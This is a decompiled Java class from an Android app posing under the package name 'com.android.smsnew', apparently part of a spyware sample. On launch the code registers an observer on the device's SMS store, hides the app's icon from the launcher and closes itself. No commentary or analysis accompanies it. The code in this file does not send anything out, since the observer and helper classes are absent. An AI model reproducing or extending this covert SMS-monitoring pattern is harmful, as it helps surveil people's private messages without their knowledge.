// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.android.smsnew;

import android.app.Activity;
import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuInflater;

// Referenced classes of package com.android.smsnew:
//            SmsContentObserver, FileUtils

public class MainActivity extends Activity
{

    public MainActivity()
    {
    }

    private void registerObserver()
    {
        SmsContentObserver smscontentobserver = new SmsContentObserver(this);
        getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, smscontentobserver);
    }

    protected void onCreate(Bundle bundle)
    {
        super.onCreate(bundle);
        setContentView(0x7f030000);
        registerObserver();
        FileUtils.invisilableIcon(this);
        finish();
    }

    public boolean onCreateOptionsMenu(Menu menu)
    {
        getMenuInflater().inflate(0x7f070000, menu);
        return true;
    }
}
